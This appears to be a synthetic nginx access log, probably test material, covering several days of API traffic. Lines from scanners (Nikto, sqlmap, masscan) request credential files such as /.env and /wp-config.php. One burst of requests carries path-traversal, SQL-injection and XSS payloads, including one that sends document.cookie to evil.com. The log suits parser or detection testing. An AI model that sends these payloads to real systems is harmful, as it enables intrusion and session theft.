180.151.34.78 - - [17/Jun/2026:19:42:24 +0530] "GET /ready HTTP/1.1" 200 32477 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.588
167.94.138.35 - - [17/Jun/2026:20:16:30 +0530] "GET /database.sql HTTP/1.1" 404 223 "-" "curl/7.88.1" rt=0.253
72.14.192.10 - api-client [17/Jun/2026:20:18:04 +0530] "GET /api/v2/admin/stats HTTP/1.1" 200 79635 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.165
223.226.45.12 - - [17/Jun/2026:20:40:56 +0530] "OPTIONS /api/v2/auth/token HTTP/1.1" 200 60023 "https://github.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.505
72.14.192.10 - - [17/Jun/2026:22:54:58 +0530] "PUT /api/v2/payments HTTP/1.1" 200 68645 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.553
74.125.224.89 - - [17/Jun/2026:23:37:52 +0530] "POST /ws/notifications HTTP/1.1" 204 94 "https://dashboard.example.com" "axios/1.6.7" rt=0.755
1.186.34.56 - - [18/Jun/2026:00:48:53 +0530] "POST /api/v2/search?q=laptop HTTP/1.1" 200 8161 "https://dashboard.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.538
122.177.99.45 - api-client [18/Jun/2026:02:59:47 +0530] "HEAD / HTTP/1.1" 200 57960 "https://github.com" "okhttp/4.12.0" rt=0.930
49.205.34.78 - - [18/Jun/2026:04:42:10 +0530] "DELETE /api/v2/users HTTP/1.1" 304 789 "https://api.example.com/docs" "okhttp/4.12.0" rt=1.401
210.18.55.34 - - [18/Jun/2026:05:43:44 +0530] "GET /static/vendors.js HTTP/1.1" 200 51408 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.067
103.7.112.45 - - [18/Jun/2026:05:50:02 +0530] "POST /assets/fonts/inter.woff2 HTTP/1.1" 201 71664 "https://app.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.519
117.96.78.45 - - [18/Jun/2026:06:46:48 +0530] "GET /api/v2/users HTTP/1.1" 200 2351 "https://www.google.com/" "okhttp/4.12.0" rt=1.030
180.151.34.78 - - [18/Jun/2026:07:37:05 +0530] "GET /api/v2/orders HTTP/1.1" 304 100 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.114
49.205.34.78 - - [18/Jun/2026:09:03:07 +0530] "GET /api/v2/auth/token HTTP/1.1" 200 75396 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.082
175.101.120.56 - - [18/Jun/2026:09:44:20 +0530] "POST /assets/fonts/inter.woff2 HTTP/1.1" 304 375 "https://dashboard.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.236
180.151.34.78 - - [18/Jun/2026:09:53:41 +0530] "GET /api/v2/cart HTTP/1.1" 200 12686 "https://github.com" "okhttp/4.12.0" rt=0.123
162.142.125.24 - - [18/Jun/2026:10:14:26 +0530] "GET /wp-login.php HTTP/1.1" 200 500 "-" "Nikto/2.1.6" rt=0.359
36.255.89.23 - - [18/Jun/2026:11:10:48 +0530] "POST /api/v2/users/5678/avatar HTTP/1.1" 304 170 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.006
117.96.78.45 - - [18/Jun/2026:11:52:44 +0530] "DELETE /api/v2/users/profile HTTP/1.1" 201 2913 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.896
110.234.52.100 - - [18/Jun/2026:12:14:20 +0530] "POST /static/vendors.js HTTP/1.1" 200 43185 "https://app.example.com" "axios/1.6.7" rt=0.324
72.14.192.10 - - [18/Jun/2026:13:30:37 +0530] "OPTIONS /health HTTP/1.1" 200 66907 "-" "axios/1.6.7" rt=0.982
125.63.44.12 - - [18/Jun/2026:14:08:42 +0530] "POST /api/v2/orders/history HTTP/1.1" 204 155 "https://api.example.com/docs" "okhttp/4.12.0" rt=0.141
36.255.89.23 - - [18/Jun/2026:15:19:06 +0530] "GET /api/v2/config HTTP/1.1" 200 55144 "https://www.google.com/" "okhttp/4.12.0" rt=0.424
27.56.145.23 - - [18/Jun/2026:18:26:29 +0530] "HEAD /metrics HTTP/1.1" 200 64330 "https://api.example.com/docs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.189
180.151.34.78 - api-client [18/Jun/2026:19:12:33 +0530] "GET /assets/fonts/inter.woff2 HTTP/1.1" 200 12435 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.720
103.7.112.45 - - [18/Jun/2026:19:54:20 +0530] "OPTIONS /api/v2/notifications HTTP/1.1" 204 373 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.220
219.91.134.67 - - [18/Jun/2026:20:24:09 +0530] "POST /api/v2/users/1234/settings HTTP/1.1" 200 25279 "https://api.example.com/docs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.041
117.96.78.45 - - [18/Jun/2026:22:30:58 +0530] "GET /api/v2/analytics/summary HTTP/1.1" 304 202 "https://api.example.com/docs" "axios/1.6.7" rt=0.537
72.14.192.10 - - [18/Jun/2026:23:10:12 +0530] "GET /api/v2/export/users HTTP/1.1" 200 42210328 "https://dashboard.example.com" "axios/1.6.7" rt=3.540
72.14.192.10 - - [18/Jun/2026:23:53:48 +0530] "GET /api/v2/orders/history HTTP/1.1" 204 25 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.144
117.96.78.45 - - [19/Jun/2026:00:01:19 +0530] "GET /metrics HTTP/1.1" 200 28525 "https://dashboard.example.com" "okhttp/4.12.0" rt=0.677
125.63.44.12 - api-client [19/Jun/2026:00:07:15 +0530] "GET /api/v2/search?q=laptop HTTP/1.1" 200 37482 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.434
185.156.73.54 - - [19/Jun/2026:00:18:00 +0530] "GET /wp-admin/ HTTP/1.1" 200 173 "-" "Nikto/2.1.6" rt=0.381
117.96.78.45 - - [19/Jun/2026:00:48:02 +0530] "GET /assets/fonts/inter.woff2 HTTP/1.1" 204 692 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.718
27.56.145.23 - api-client [19/Jun/2026:01:25:50 +0530] "GET /static/vendors.js HTTP/1.1" 200 24920 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.934
117.96.78.45 - - [19/Jun/2026:01:30:18 +0530] "OPTIONS /api/v2/users/profile HTTP/1.1" 200 57419 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.002
36.255.89.23 - - [19/Jun/2026:01:45:46 +0530] "GET /api/v2/products HTTP/1.1" 301 281 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.548
122.177.99.45 - - [19/Jun/2026:02:16:44 +0530] "HEAD /static/vendors.js HTTP/1.1" 200 40604 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.301
1.186.34.56 - - [19/Jun/2026:02:22:17 +0530] "GET /api/v2/analytics/summary HTTP/1.1" 200 56445 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.006
117.96.78.45 - - [19/Jun/2026:02:38:21 +0530] "GET /static/style.css HTTP/1.1" 200 67730 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.484
162.142.125.24 - - [19/Jun/2026:03:00:40 +0530] "GET /api/v2/debug HTTP/1.1" 200 118 "-" "Go-http-client/1.1" rt=0.039
162.142.125.24 - - [19/Jun/2026:03:00:47 +0530] "GET /.env HTTP/1.1" 404 123 "-" "Go-http-client/1.1" rt=0.091
162.142.125.24 - - [19/Jun/2026:03:00:49 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 311 "-" "Go-http-client/1.1" rt=0.065
162.142.125.24 - - [19/Jun/2026:03:01:01 +0530] "GET /actuator HTTP/1.1" 403 282 "-" "Go-http-client/1.1" rt=0.004
162.142.125.24 - - [19/Jun/2026:03:01:05 +0530] "GET /admin HTTP/1.1" 404 369 "-" "Go-http-client/1.1" rt=0.007
162.142.125.24 - - [19/Jun/2026:03:01:13 +0530] "GET /.env HTTP/1.1" 404 134 "-" "Go-http-client/1.1" rt=0.056
162.142.125.24 - - [19/Jun/2026:03:01:17 +0530] "GET / HTTP/1.1" 404 320 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.093
162.142.125.24 - - [19/Jun/2026:03:01:17 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 50 "-" "Go-http-client/1.1" rt=0.054
162.142.125.24 - - [19/Jun/2026:03:01:35 +0530] "GET /wp-login.php HTTP/1.1" 200 195 "-" "Go-http-client/1.1" rt=0.084
162.142.125.24 - - [19/Jun/2026:03:01:36 +0530] "GET / HTTP/1.1" 200 337 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.026
117.96.78.45 - - [19/Jun/2026:04:43:54 +0530] "HEAD /api/v2/notifications HTTP/1.1" 200 36407 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.416
110.234.52.100 - - [19/Jun/2026:04:48:58 +0530] "POST /api/v2/orders/history HTTP/1.1" 200 18007 "https://www.google.com/" "axios/1.6.7" rt=0.736
125.63.44.12 - - [19/Jun/2026:04:53:01 +0530] "GET /static/bundle.js HTTP/1.1" 200 54184 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.261
223.226.45.12 - - [19/Jun/2026:05:24:03 +0530] "DELETE /api/v2/products/search HTTP/1.1" 301 347 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.985
210.18.55.34 - - [19/Jun/2026:05:46:40 +0530] "GET /api/v2/analytics/raw HTTP/1.1" 200 56589056 "https://app.example.com" "axios/1.6.7" rt=6.847
117.96.78.45 - - [19/Jun/2026:07:48:31 +0530] "OPTIONS /api/v2/products/search HTTP/1.1" 301 644 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.243
162.142.125.24 - - [19/Jun/2026:08:47:11 +0530] "GET /api/v2/swagger.json HTTP/1.1" 301 209 "-" "python-requests/2.31.0" rt=0.020
103.7.112.45 - api-client [19/Jun/2026:08:48:21 +0530] "PUT /static/bundle.js HTTP/1.1" 200 62054 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.085
91.108.4.200 - - [19/Jun/2026:09:00:09 +0530] "POST /api/v2/config?debug=../../../../etc/passwd HTTP/1.1" 404 1787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.465
91.108.4.200 - - [19/Jun/2026:09:00:12 +0530] "GET /api/v2/search?q=<script>alert(1)</script> HTTP/1.1" 200 2177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.213
91.108.4.200 - - [19/Jun/2026:09:00:15 +0530] "POST /api/v2/config?debug=../../../../etc/passwd HTTP/1.1" 404 3850 "-" "Nikto/2.1.6" rt=1.875
91.108.4.200 - - [19/Jun/2026:09:00:20 +0530] "GET /actuator/env HTTP/1.1" 200 3716 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.549
91.108.4.200 - - [19/Jun/2026:09:00:39 +0530] "GET /wp-config.php HTTP/1.1" 400 3784 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.513
91.108.4.200 - - [19/Jun/2026:09:00:43 +0530] "GET /api/v2/users?id=1' OR '1'='1 HTTP/1.1" 200 697 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.578
91.108.4.200 - - [19/Jun/2026:09:00:50 +0530] "POST /.git/HEAD HTTP/1.1" 403 2324 "-" "Nikto/2.1.6" rt=0.708
91.108.4.200 - - [19/Jun/2026:09:00:53 +0530] "POST /api/v2/users?search=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)> HTTP/1.1" 403 3634 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.570
91.108.4.200 - - [19/Jun/2026:09:02:30 +0530] "POST /api/v2/users?name=admin'-- HTTP/1.1" 400 3370 "-" "Nikto/2.1.6" rt=0.717
91.108.4.200 - - [19/Jun/2026:09:02:49 +0530] "GET /api/v2/users?name=admin'-- HTTP/1.1" 404 3252 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.023
91.108.4.200 - - [19/Jun/2026:09:03:29 +0530] "GET /admin/ HTTP/1.1" 200 1295 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.402
91.108.4.200 - - [19/Jun/2026:09:03:58 +0530] "POST /actuator/env HTTP/1.1" 422 2362 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.570
91.108.4.200 - - [19/Jun/2026:09:04:14 +0530] "POST /api/v2/search?q=<script>alert(1)</script> HTTP/1.1" 400 2587 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.093
91.108.4.200 - - [19/Jun/2026:09:04:15 +0530] "GET /actuator/env HTTP/1.1" 200 886 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.164
91.108.4.200 - - [19/Jun/2026:09:04:22 +0530] "POST /api/v2/products?filter=1 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1" 422 1096 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.552
91.108.4.200 - - [19/Jun/2026:09:04:28 +0530] "GET /.git/HEAD HTTP/1.1" 400 461 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.091
180.151.34.78 - - [19/Jun/2026:11:08:28 +0530] "PUT /ready HTTP/1.1" 200 9722 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.429
223.226.45.12 - - [19/Jun/2026:12:18:59 +0530] "OPTIONS /static/style.css HTTP/1.1" 200 27165 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.961
167.94.138.35 - - [19/Jun/2026:12:57:50 +0530] "GET /api/v2/internal HTTP/1.1" 200 534 "-" "curl/7.88.1" rt=0.344
49.205.34.78 - - [19/Jun/2026:13:42:57 +0530] "GET /health HTTP/1.1" 200 41401 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.335
175.101.120.56 - - [19/Jun/2026:14:10:30 +0530] "HEAD /static/vendors.js HTTP/1.1" 301 295 "https://github.com" "axios/1.6.7" rt=0.677
125.63.44.12 - - [19/Jun/2026:14:46:54 +0530] "GET /api/v2/trending HTTP/1.1" 200 61868 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.048
117.96.78.45 - - [19/Jun/2026:15:00:00 +0530] "OPTIONS / HTTP/1.1" 200 70803 "https://dashboard.example.com" "okhttp/4.12.0" rt=0.496
61.246.78.34 - - [19/Jun/2026:15:21:33 +0530] "GET /api/v2/payments HTTP/1.1" 200 74869 "https://app.example.com" "okhttp/4.12.0" rt=0.481
185.156.73.54 - - [19/Jun/2026:15:38:33 +0530] "GET /server-status HTTP/1.1" 403 261 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.313
210.18.55.34 - - [19/Jun/2026:17:41:23 +0530] "PUT /api/v2/analytics/raw HTTP/1.1" 200 51701081 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=7.617
103.195.201.34 - - [19/Jun/2026:17:46:14 +0530] "GET /api/v2/orders HTTP/1.1" 200 56076 "https://api.example.com/docs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.179
27.56.145.23 - - [19/Jun/2026:19:19:48 +0530] "DELETE /api/v2/config HTTP/1.1" 200 63946 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.408
72.14.192.10 - - [19/Jun/2026:19:22:08 +0530] "PUT /api/v2/data/dump HTTP/1.1" 200 23485701 "-" "axios/1.6.7" rt=4.199
61.246.78.34 - api-client [19/Jun/2026:19:29:16 +0530] "GET /api/v2/notifications HTTP/1.1" 201 35605 "https://github.com" "axios/1.6.7" rt=0.586
not a valid nginx log line
110.234.52.100 - - [19/Jun/2026:20:39:18 +0530] "POST /api/v2/users/5678/avatar HTTP/1.1" 304 406 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.305
175.101.120.56 - - [19/Jun/2026:20:57:05 +0530] "POST /api/v2/search?q=laptop HTTP/1.1" 200 72184 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.636
27.56.145.23 - - [19/Jun/2026:21:20:33 +0530] "GET /api/v2/users/profile HTTP/1.1" 204 752 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.444
72.14.192.10 - - [19/Jun/2026:22:53:53 +0530] "PUT /assets/fonts/inter.woff2 HTTP/1.1" 200 42383 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.135
223.226.45.12 - - [19/Jun/2026:23:47:24 +0530] "POST /api/v2/orders HTTP/1.1" 200 64745 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.531
103.7.112.45 - - [20/Jun/2026:00:30:29 +0530] "GET /ready HTTP/1.1" 200 4379 "https://github.com" "okhttp/4.12.0" rt=0.713
117.96.78.45 - - [20/Jun/2026:01:23:53 +0530] "GET /api/v2/search?q=phone HTTP/1.1" 304 546 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.909
74.125.224.89 - - [20/Jun/2026:01:27:55 +0530] "GET /ws/notifications HTTP/1.1" 200 59132 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.692
122.177.99.45 - - [20/Jun/2026:03:16:57 +0530] "GET /api/v2/search?q=laptop HTTP/1.1" 201 70317 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.087
125.63.44.12 - - [20/Jun/2026:03:38:16 +0530] "GET /api/v2/config HTTP/1.1" 201 68438 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.683
74.125.224.89 - api-client [20/Jun/2026:04:14:04 +0530] "GET / HTTP/1.1" 200 25477 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.540
72.14.192.10 - - [20/Jun/2026:05:15:06 +0530] "GET /health HTTP/1.1" 200 3136 "https://api.example.com/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.618
122.177.99.45 - - [20/Jun/2026:05:34:20 +0530] "POST /api/v2/users/1234/settings HTTP/1.1" 301 239 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.280
162.142.125.24 - - [20/Jun/2026:06:12:42 +0530] "GET /api/v2/swagger.json HTTP/1.1" 301 614 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.155
1.186.34.56 - api-client [20/Jun/2026:06:14:29 +0530] "HEAD /api/v2/auth/token HTTP/1.1" 200 46592 "https://app.example.com" "axios/1.6.7" rt=0.577
162.142.125.24 - - [20/Jun/2026:08:26:14 +0530] "GET /admin HTTP/1.1" 404 75 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.491
167.94.138.35 - - [20/Jun/2026:08:38:21 +0530] "GET /database.sql HTTP/1.1" 200 617 "-" "Nikto/2.1.6" rt=0.313
72.14.192.10 - - [20/Jun/2026:09:15:02 +0530] "GET /assets/fonts/inter.woff2 HTTP/1.1" 200 14699 "https://api.example.com/docs" "axios/1.6.7" rt=1.282
117.96.78.45 - - [20/Jun/2026:10:34:39 +0530] "PUT /api/v2/products/search HTTP/1.1" 304 427 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.010
61.246.78.34 - - [20/Jun/2026:10:52:02 +0530] "GET /api/v2/payments HTTP/1.1" 200 33240 "https://api.example.com/docs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.787
175.101.120.56 - - [20/Jun/2026:11:22:30 +0530] "HEAD /api/v2/products/search HTTP/1.1" 301 420 "https://app.example.com" "axios/1.6.7" rt=0.411
175.101.120.56 - - [20/Jun/2026:11:43:43 +0530] "OPTIONS /static/bundle.js HTTP/1.1" 200 57747 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.462
61.246.78.34 - - [20/Jun/2026:12:41:24 +0530] "DELETE /api/v2/auth/token HTTP/1.1" 301 47 "https://dashboard.example.com" "axios/1.6.7" rt=0.244
103.7.112.45 - - [20/Jun/2026:13:33:49 +0530] "GET /api/v2/products HTTP/1.1" 304 618 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.287
103.7.112.45 - api-client [20/Jun/2026:13:59:38 +0530] "GET /api/v2/users/5678/avatar HTTP/1.1" 304 70 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.264
103.7.112.45 - api-client [20/Jun/2026:14:26:39 +0530] "POST /static/style.css HTTP/1.1" 200 50425 "https://app.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.071
162.142.125.24 - - [20/Jun/2026:14:47:22 +0530] "GET /api/v2/swagger.json HTTP/1.1" 200 581 "-" "Nikto/2.1.6" rt=0.055
210.18.55.34 - - [20/Jun/2026:15:41:43 +0530] "GET /api/v2/reports/financial HTTP/1.1" 200 41888703 "https://github.com" "axios/1.6.7" rt=11.847
223.226.45.12 - - [20/Jun/2026:16:50:37 +0530] "GET /static/vendors.js HTTP/1.1" 200 29309 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.112
219.91.134.67 - - [20/Jun/2026:17:12:58 +0530] "GET /api/v2/orders HTTP/1.1" 200 9879 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.151
162.142.125.24 - - [20/Jun/2026:17:12:59 +0530] "GET /v1/secret/data HTTP/1.1" 404 697 "-" "curl/7.88.1" rt=0.338
36.255.89.23 - - [20/Jun/2026:18:34:01 +0530] "PUT /ready HTTP/1.1" 200 29613 "https://api.example.com/docs" "okhttp/4.12.0" rt=1.463
219.91.134.67 - api-client [20/Jun/2026:19:21:26 +0530] "DELETE /assets/fonts/inter.woff2 HTTP/1.1" 200 9997 "https://app.example.com" "axios/1.6.7" rt=0.785
210.18.55.34 - - [20/Jun/2026:20:59:58 +0530] "GET /api/v2/backup/snapshot HTTP/1.1" 200 19920304 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=10.054
125.63.44.12 - api-client [20/Jun/2026:21:39:27 +0530] "OPTIONS /api/v2/trending HTTP/1.1" 201 2384 "https://dashboard.example.com" "okhttp/4.12.0" rt=1.242
36.255.89.23 - api-client [20/Jun/2026:22:20:31 +0530] "GET /api/v2/notifications HTTP/1.1" 200 59495 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.562
180.151.34.78 - api-client [20/Jun/2026:23:49:17 +0530] "DELETE /api/v2/payments HTTP/1.1" 200 8319 "https://dashboard.example.com" "axios/1.6.7" rt=1.080
125.63.44.12 - - [21/Jun/2026:00:24:33 +0530] "GET /api/v2/orders HTTP/1.1" 200 37005 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.953
117.96.78.45 - - [21/Jun/2026:02:08:55 +0530] "POST /api/v2/search?q=laptop HTTP/1.1" 200 71675 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.379
103.195.201.34 - api-client [21/Jun/2026:02:22:38 +0530] "POST /api/v2/config HTTP/1.1" 304 209 "https://github.com" "okhttp/4.12.0" rt=1.353
74.125.224.89 - - [21/Jun/2026:03:21:47 +0530] "GET /health HTTP/1.1" 204 385 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.988
